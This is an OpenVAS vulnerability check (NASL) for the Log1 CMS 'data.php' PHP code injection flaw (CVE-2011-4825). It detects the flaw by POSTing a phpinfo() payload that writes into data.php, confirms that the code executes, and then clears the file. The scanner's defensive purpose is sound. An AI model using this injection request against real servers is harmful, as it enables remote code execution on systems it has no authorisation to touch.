###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_log1_cms_50523.nasl 12 2013-10-27 11:15:33Z jan $
#
# Log1 CMS 'data.php' PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Log1 CMS is prone to a remote PHP code-injection vulnerability.

An attacker can exploit this issue to inject and execute arbitrary PHP
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system; other attacks
are also possible.

Log1 CMS 2.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103496);
 script_cve_id("CVE-2011-4825");
 script_bugtraq_id(50523);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_name("Log1 CMS 'data.php' PHP Code Injection Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50523");

 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-06-18 17:36:01 +0100 (Mon, 18 Jun 2012)");
 script_description(desc);
 script_summary("Determine if installed Log1 CMS is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

host = get_host_name();
ex = string("bla=1&blub=2&foo=<?php phpinfo(); ?>");

dirs = make_list("/cms",cgi_dirs());

foreach dir (dirs) {

  filename = string(dir,"/admin/libraries/ajaxfilemanager/ajax_create_folder.php");

  req = string("POST ", filename, " HTTP/1.1\r\n", 
               "Host: ", host, ":", port, "\r\n",
               "Accept-Encoding: identity\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n", 
               "Content-Length: ", strlen(ex), 
               "\r\n\r\n", 
               ex);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(result =~ "HTTP/1.. 200") {

    url = string(dir, "/admin/libraries/ajaxfilemanager/inc/data.php");
    req = http_get(item:url, port:port);

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >< result) {

      # clean the data.php on success by sending empty POST...
      ex = string("");

      req = string("POST ", filename, " HTTP/1.1\r\n", 
                   "Host: ", host, ":", port, "\r\n",
                   "Accept-Encoding: identity\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n", 
                   "Content-Length: ", strlen(ex), 
                   "\r\n\r\n", 
                   ex); 

      result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
      security_hole(port:port);
      exit(0);

    }

  }

}

exit(0);
